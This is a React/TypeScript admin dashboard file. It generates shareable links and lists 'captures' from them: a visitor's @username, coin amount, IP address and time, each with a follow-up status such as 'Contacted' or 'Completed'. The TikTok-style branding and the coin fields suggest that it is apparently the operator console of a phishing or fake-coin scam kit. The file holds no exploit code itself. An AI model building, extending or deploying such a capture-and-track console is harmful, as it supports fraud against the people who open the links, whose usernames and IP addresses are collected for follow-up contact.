import { useState, useEffect, useCallback } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import {
  ShieldCheck, LogOut, Link2, Copy, Check, Eye, Trash2,
  Users, Coins, Activity, Clock, ChevronDown,
  ChevronUp, Search, AlertTriangle, BarChart3,
  ExternalLink
} from 'lucide-react'
import {
  validateAdmin,
  getAdminSession,
  setAdminSession,
  clearAdminSession,
  generateLink,
  getAdminLinks,
  getAdminStats,
  updateLinkMessage,
  updateCaptureStatus,
  deleteLink,
  subscribeToStorageChanges,
  type Link,
} from '../lib/storage'

type TabType = 'dashboard' | 'links' | 'captures'

export default function AdminPanel() {
  const { adminId } = useParams<{ adminId: string }>()
  const navigate = useNavigate()
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [loginForm, setLoginForm] = useState({ username: '', password: '' })
  const [loginError, setLoginError] = useState(false)
  const [adminName, setAdminName] = useState('')
  const [activeTab, setActiveTab] = useState<TabType>('dashboard')
  const [links, setLinks] = useState<Link[]>([])
  const [stats, setStats] = useState({ totalLinks: 0, totalCaptures: 0 })
  const [copiedLink, setCopiedLink] = useState<string | null>(null)
  const [expandedLink, setExpandedLink] = useState<string | null>(null)
  const [customMessages, setCustomMessages] = useState<Record<string, string>>({})
  const [captureStatuses, setCaptureStatuses] = useState<Record<string, string>>({})
  const [searchTerm, setSearchTerm] = useState('')
  const [showShake, setShowShake] = useState(false)

  // Check session on mount
  useEffect(() => {
    const session = getAdminSession()
    if (session && session.adminId === adminId) {
      setIsLoggedIn(true)
      setAdminName(session.adminName)
    }
  }, [adminId])

  // Load data
  const loadData = useCallback(() => {
    if (adminId) {
      const adminLinks = getAdminLinks(adminId)
      setLinks(adminLinks)
      const adminStats = getAdminStats(adminId)
      setStats(adminStats)
    }
  }, [adminId])

  useEffect(() => {
    if (isLoggedIn) {
      loadData()
      const unsub = subscribeToStorageChanges(loadData)
      const interval = setInterval(loadData, 2000)
      return () => {
        unsub()
        clearInterval(interval)
      }
    }
  }, [isLoggedIn, loadData])

  const handleLogin = () => {
    if (!loginForm.username || !loginForm.password) {
      setShowShake(true)
      setTimeout(() => setShowShake(false), 500)
      return
    }
    const admin = validateAdmin(loginForm.username, loginForm.password)
    if (admin && admin.id === adminId) {
      setAdminSession(admin.id, admin.username)
      setIsLoggedIn(true)
      setAdminName(admin.username)
      setLoginError(false)
    } else {
      setLoginError(true)
      setShowShake(true)
      setTimeout(() => setShowShake(false), 500)
    }
  }

  const handleLogout = () => {
    clearAdminSession()
    setIsLoggedIn(false)
    setAdminName('')
    navigate('/')
  }

  const handleGenerateLink = () => {
    if (adminId && adminName) {
      const newLink = generateLink(adminId, adminName)
      loadData()
      // Auto copy to clipboard
      navigator.clipboard.writeText(newLink.url)
      setCopiedLink(newLink.id)
      setTimeout(() => setCopiedLink(null), 2000)
    }
  }

  const copyToClipboard = (url: string, linkId: string) => {
    navigator.clipboard.writeText(url)
    setCopiedLink(linkId)
    setTimeout(() => setCopiedLink(null), 2000)
  }

  const handleUpdateMessage = (linkId: string) => {
    const message = customMessages[linkId]
    if (message !== undefined) {
      updateLinkMessage(linkId, message)
      loadData()
    }
  }

  const handleUpdateStatus = (linkId: string, captureId: string) => {
    const status = captureStatuses[`${linkId}_${captureId}`]
    if (status !== undefined) {
      updateCaptureStatus(linkId, captureId, status)
      loadData()
    }
  }

  const handleDeleteLink = (linkId: string) => {
    if (window.confirm('Are you sure you want to delete this link? All captured data will be lost.')) {
      deleteLink(linkId)
      loadData()
    }
  }

  const allCaptures = links.flatMap(link =>
    link.captures.map(cap => ({ ...cap, linkId: link.id, linkSlug: link.slug }))
  )

  const filteredCaptures = allCaptures.filter(cap =>
    cap.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
    cap.coinAmount.toString().includes(searchTerm)
  )

  // Login Screen
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0f0f0f] flex items-center justify-center p-4">
        <div className="fixed inset-0 pointer-events-none">
          <div className="absolute top-[20%] left-[20%] w-[40%] h-[40%] rounded-full bg-pink-500/5 blur-[150px]" />
          <div className="absolute bottom-[20%] right-[20%] w-[40%] h-[40%] rounded-full bg-cyan-400/5 blur-[150px]" />
        </div>

        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className={`relative w-full max-w-md ${showShake ? 'animate-shake' : ''}`}
        >
          <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-2xl p-8">
            <motion.div
              initial={{ y: -20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.1 }}
              className="text-center mb-8"
            >
              <div className="w-16 h-16 rounded-xl bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center mx-auto mb-4">
                <ShieldCheck className="w-8 h-8 text-white" />
              </div>
              <h1 className="text-2xl font-bold text-white">Admin Portal</h1>
              <p className="text-sm text-gray-500 mt-1">Secure login required</p>
            </motion.div>

            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.2 }}
              className="space-y-4"
            >
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">Username</label>
                <input
                  type="text"
                  value={loginForm.username}
                  onChange={(e) => setLoginForm({ ...loginForm, username: e.target.value })}
                  onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                  placeholder="Enter username"
                  className="w-full h-12 bg-[#0f0f0f] border border-[#2c2c2c] rounded-xl px-4 text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55] transition-all"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">Password</label>
                <input
                  type="password"
                  value={loginForm.password}
                  onChange={(e) => setLoginForm({ ...loginForm, password: e.target.value })}
                  onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                  placeholder="Enter password"
                  className="w-full h-12 bg-[#0f0f0f] border border-[#2c2c2c] rounded-xl px-4 text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55] transition-all"
                />
              </div>

              <AnimatePresence>
                {loginError && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    exit={{ opacity: 0, height: 0 }}
                    className="flex items-center gap-2 text-red-400 text-sm bg-red-500/10 rounded-lg p-3"
                  >
                    <AlertTriangle className="w-4 h-4" />
                    Invalid username or password
                  </motion.div>
                )}
              </AnimatePresence>

              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={handleLogin}
                className="w-full h-12 bg-gradient-to-r from-pink-500 to-rose-600 rounded-xl font-semibold text-white transition-all"
              >
                Login
              </motion.button>
            </motion.div>
          </div>
        </motion.div>
      </div>
    )
  }

  // Main Admin Dashboard
  return (
    <div className="min-h-screen bg-[#0f0f0f] text-white">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-black/80 backdrop-blur-md border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center">
              <ShieldCheck className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-sm font-bold text-white">Admin: {adminName}</h1>
              <p className="text-xs text-gray-500">Control Panel</p>
            </div>
          </div>
          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={handleLogout}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-sm"
          >
            <LogOut className="w-4 h-4" />
            Logout
          </motion.button>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          {[
            { label: 'Total Links', value: stats.totalLinks, icon: Link2, color: 'from-pink-500 to-rose-600', delay: 0 },
            { label: 'Total Captures', value: stats.totalCaptures, icon: Users, color: 'from-cyan-400 to-teal-500', delay: 0.1 },
            { label: 'Active Today', value: links.filter(l => {
              const today = new Date().toDateString()
              return new Date(l.createdAt).toDateString() === today || l.captures.some(c => new Date(c.timestamp).toDateString() === today)
            }).length, icon: Activity, color: 'from-purple-500 to-indigo-600', delay: 0.2 },
          ].map((stat) => {
            const Icon = stat.icon
            return (
              <motion.div
                key={stat.label}
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: stat.delay }}
                className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-5"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-500">{stat.label}</p>
                    <motion.p
                      key={stat.value}
                      initial={{ scale: 1.2 }}
                      animate={{ scale: 1 }}
                      className="text-2xl font-bold text-white mt-1"
                    >
                      {stat.value}
                    </motion.p>
                  </div>
                  <div className={`w-12 h-12 rounded-xl bg-gradient-to-r ${stat.color} flex items-center justify-center`}>
                    <Icon className="w-6 h-6 text-white" />
                  </div>
                </div>
              </motion.div>
            )
          })}
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-6">
          {([
            { id: 'dashboard', label: 'Dashboard', icon: BarChart3 },
            { id: 'links', label: 'Links', icon: Link2 },
            { id: 'captures', label: 'Captures', icon: Eye },
          ] as const).map((tab) => {
            const Icon = tab.icon
            const isActive = activeTab === tab.id
            return (
              <motion.button
                key={tab.id}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-medium transition-all ${
                  isActive
                    ? 'bg-gradient-to-r from-pink-500 to-rose-600 text-white'
                    : 'bg-[#1a1a1a] text-gray-400 hover:text-white border border-[#2c2c2c]'
                }`}
              >
                <Icon className="w-4 h-4" />
                {tab.label}
              </motion.button>
            )
          })}
        </div>

        {/* Tab Content */}
        <AnimatePresence mode="wait">
          {activeTab === 'dashboard' && (
            <motion.div
              key="dashboard"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6"
            >
              {/* Quick Actions */}
              <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6">
                <h3 className="text-lg font-semibold text-white mb-4">Quick Actions</h3>
                <div className="flex flex-wrap gap-3">
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={handleGenerateLink}
                    className="btn-3d flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-pink-500 to-rose-600 rounded-xl font-medium text-white shadow-lg shadow-pink-500/25"
                  >
                    <Link2 className="w-5 h-5" />
                    Generate New Link
                  </motion.button>
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => setActiveTab('links')}
                    className="flex items-center gap-2 px-6 py-3 bg-[#252525] border border-[#2c2c2c] rounded-xl font-medium text-gray-300 hover:text-white transition-all"
                  >
                    <Eye className="w-5 h-5" />
                    View All Links
                  </motion.button>
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => setActiveTab('captures')}
                    className="flex items-center gap-2 px-6 py-3 bg-[#252525] border border-[#2c2c2c] rounded-xl font-medium text-gray-300 hover:text-white transition-all"
                  >
                    <Users className="w-5 h-5" />
                    View Captures
                  </motion.button>
                </div>
              </div>

              {/* Recent Activity */}
              <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-white">Recent Captures</h3>
                  <span className="text-xs text-gray-500">Live updates</span>
                </div>
                {allCaptures.length === 0 ? (
                  <div className="text-center py-8 text-gray-600">
                    <Users className="w-12 h-12 mx-auto mb-3 opacity-50" />
                    <p>No captures yet. Generate a link and share it!</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {allCaptures.slice(0, 5).map((cap, i) => (
                      <motion.div
                        key={cap.id}
                        initial={{ x: -20, opacity: 0 }}
                        animate={{ x: 0, opacity: 1 }}
                        transition={{ delay: i * 0.05 }}
                        className="flex items-center gap-4 p-3 rounded-lg bg-[#0f0f0f] border border-[#2c2c2c]"
                      >
                        <div className="w-10 h-10 rounded-full bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center flex-shrink-0">
                          <Users className="w-5 h-5 text-white" />
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-medium text-white truncate">@{cap.username}</p>
                          <p className="text-xs text-gray-500">{cap.coinAmount.toLocaleString()} coins</p>
                        </div>
                        <div className="text-right flex-shrink-0">
                          <span className={`text-xs px-2 py-1 rounded-full ${
                            cap.status === 'New' ? 'bg-yellow-500/20 text-yellow-400' :
                            cap.status === 'Processing' ? 'bg-blue-500/20 text-blue-400' :
                            cap.status === 'Completed' ? 'bg-green-500/20 text-green-400' :
                            'bg-gray-500/20 text-gray-400'
                          }`}>
                            {cap.status}
                          </span>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          )}

          {activeTab === 'links' && (
            <motion.div
              key="links"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-white">Generated Links</h3>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={handleGenerateLink}
                  className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-pink-500 to-rose-600 rounded-lg text-sm font-medium text-white"
                >
                  <Link2 className="w-4 h-4" />
                  Generate New
                </motion.button>
              </div>

              {links.length === 0 ? (
                <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-8 text-center">
                  <Link2 className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                  <p className="text-gray-500">No links generated yet.</p>
                  <motion.button
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                    onClick={handleGenerateLink}
                    className="mt-4 px-6 py-2 bg-pink-500/20 text-pink-400 rounded-lg text-sm"
                  >
                    Generate your first link
                  </motion.button>
                </div>
              ) : (
                <div className="space-y-4">
                  {links.map((link, i) => (
                    <motion.div
                      key={link.id}
                      initial={{ y: 20, opacity: 0 }}
                      animate={{ y: 0, opacity: 1 }}
                      transition={{ delay: i * 0.05 }}
                      className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl overflow-hidden"
                    >
                      {/* Link Header */}
                      <div className="p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-3">
                            <div className="w-8 h-8 rounded-lg bg-gradient-to-r from-cyan-400 to-teal-500 flex items-center justify-center">
                              <Link2 className="w-4 h-4 text-white" />
                            </div>
                            <div>
                              <p className="text-sm font-medium text-white">Link #{i + 1}</p>
                              <p className="text-xs text-gray-500">{link.captures.length} captures</p>
                            </div>
                          </div>
                          <div className="flex items-center gap-2">
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => copyToClipboard(link.url, link.id)}
                              className="p-2 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                            >
                              {copiedLink === link.id ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                            </motion.button>
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => window.open(link.url, '_blank')}
                              className="p-2 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                            >
                              <ExternalLink className="w-4 h-4" />
                            </motion.button>
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => handleDeleteLink(link.id)}
                              className="p-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all"
                            >
                              <Trash2 className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>

                        {/* URL Display */}
                        <div className="bg-[#0f0f0f] rounded-lg p-3 mb-3">
                          <code className="text-xs text-cyan-400 break-all">{link.url}</code>
                        </div>

                        {/* Custom Message */}
                        <div className="flex gap-2">
                          <input
                            type="text"
                            defaultValue={link.customMessage}
                            onChange={(e) => setCustomMessages({ ...customMessages, [link.id]: e.target.value })}
                            placeholder="Custom message for users..."
                            className="flex-1 h-9 bg-[#0f0f0f] border border-[#2c2c2c] rounded-lg px-3 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55]"
                          />
                          <motion.button
                            whileHover={{ scale: 1.05 }}
                            whileTap={{ scale: 0.95 }}
                            onClick={() => handleUpdateMessage(link.id)}
                            className="px-3 py-1.5 bg-[#252525] text-gray-300 rounded-lg text-xs hover:bg-[#303030] transition-all"
                          >
                            Update
                          </motion.button>
                        </div>
                      </div>

                      {/* Expandable Captures */}
                      {link.captures.length > 0 && (
                        <div className="border-t border-[#2c2c2c]">
                          <button
                            onClick={() => setExpandedLink(expandedLink === link.id ? null : link.id)}
                            className="w-full px-4 py-2 flex items-center justify-between text-xs text-gray-500 hover:text-white transition-all"
                          >
                            <span>View {link.captures.length} capture{link.captures.length !== 1 ? 's' : ''}</span>
                            {expandedLink === link.id ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                          </button>
                          <AnimatePresence>
                            {expandedLink === link.id && (
                              <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                className="overflow-hidden"
                              >
                                <div className="px-4 pb-4 space-y-2">
                                  {link.captures.map((cap) => (
                                    <div
                                      key={cap.id}
                                      className="bg-[#0f0f0f] rounded-lg p-3 text-xs"
                                    >
                                      <div className="flex items-center justify-between mb-2">
                                        <span className="font-medium text-white">@{cap.username}</span>
                                        <span className="text-gray-500">{new Date(cap.timestamp).toLocaleString()}</span>
                                      </div>
                                      <div className="flex items-center gap-4 text-gray-400 mb-2">
                                        <span className="flex items-center gap-1">
                                          <Coins className="w-3 h-3" />
                                          {cap.coinAmount.toLocaleString()} coins
                                        </span>
                                        <span className="flex items-center gap-1">
                                          <Activity className="w-3 h-3" />
                                          {cap.ipAddress}
                                        </span>
                                      </div>
                                      <div className="flex gap-2">
                                        <select
                                          defaultValue={cap.status}
                                          onChange={(e) => setCaptureStatuses({ ...captureStatuses, [`${link.id}_${cap.id}`]: e.target.value })}
                                          className="flex-1 h-7 bg-[#1a1a1a] border border-[#2c2c2c] rounded px-2 text-xs text-white focus:outline-none focus:border-[#fe2c55]"
                                        >
                                          <option value="New">New</option>
                                          <option value="Processing">Processing</option>
                                          <option value="Contacted">Contacted</option>
                                          <option value="Completed">Completed</option>
                                          <option value="Rejected">Rejected</option>
                                        </select>
                                        <motion.button
                                          whileHover={{ scale: 1.05 }}
                                          whileTap={{ scale: 0.95 }}
                                          onClick={() => handleUpdateStatus(link.id, cap.id)}
                                          className="px-3 py-1 bg-[#252525] text-gray-300 rounded text-xs hover:bg-[#303030] transition-all"
                                        >
                                          Save
                                        </motion.button>
                                      </div>
                                    </div>
                                  ))}
                                </div>
                              </motion.div>
                            )}
                          </AnimatePresence>
                        </div>
                      )}
                    </motion.div>
                  ))}
                </div>
              )}
            </motion.div>
          )}

          {activeTab === 'captures' && (
            <motion.div
              key="captures"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              {/* Search */}
              <div className="relative mb-4">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                <input
                  type="text"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder="Search by username or coin amount..."
                  className="w-full h-11 bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl pl-11 pr-4 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55]"
                />
              </div>

              {filteredCaptures.length === 0 ? (
                <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-8 text-center">
                  <Eye className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                  <p className="text-gray-500">
                    {searchTerm ? 'No captures match your search.' : 'No captures yet.'}
                  </p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="text-left text-xs text-gray-500 border-b border-[#2c2c2c]">
                        <th className="pb-3 px-4">User</th>
                        <th className="pb-3 px-4">Coins</th>
                        <th className="pb-3 px-4">Status</th>
                        <th className="pb-3 px-4">Time</th>
                        <th className="pb-3 px-4">IP</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredCaptures.map((cap, i) => (
                        <motion.tr
                          key={cap.id}
                          initial={{ x: -10, opacity: 0 }}
                          animate={{ x: 0, opacity: 1 }}
                          transition={{ delay: i * 0.03 }}
                          className="border-b border-[#1f1f1f] hover:bg-[#1e1e1e] transition-colors"
                        >
                          <td className="py-3 px-4">
                            <div className="flex items-center gap-2">
                              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center">
                                <Users className="w-4 h-4 text-white" />
                              </div>
                              <span className="text-sm text-white font-medium">@{cap.username}</span>
                            </div>
                          </td>
                          <td className="py-3 px-4">
                            <span className="flex items-center gap-1 text-sm text-cyan-400">
                              <Coins className="w-3.5 h-3.5" />
                              {cap.coinAmount.toLocaleString()}
                            </span>
                          </td>
                          <td className="py-3 px-4">
                            <span className={`text-xs px-2 py-1 rounded-full ${
                              cap.status === 'New' ? 'bg-yellow-500/20 text-yellow-400' :
                              cap.status === 'Processing' ? 'bg-blue-500/20 text-blue-400' :
                              cap.status === 'Completed' ? 'bg-green-500/20 text-green-400' :
                              cap.status === 'Contacted' ? 'bg-purple-500/20 text-purple-400' :
                              'bg-red-500/20 text-red-400'
                            }`}>
                              {cap.status}
                            </span>
                          </td>
                          <td className="py-3 px-4 text-xs text-gray-500">
                            <span className="flex items-center gap-1">
                              <Clock className="w-3 h-3" />
                              {new Date(cap.timestamp).toLocaleString()}
                            </span>
                          </td>
                          <td className="py-3 px-4 text-xs text-gray-500">
                            {cap.ipAddress}
                          </td>
                        </motion.tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  )
}
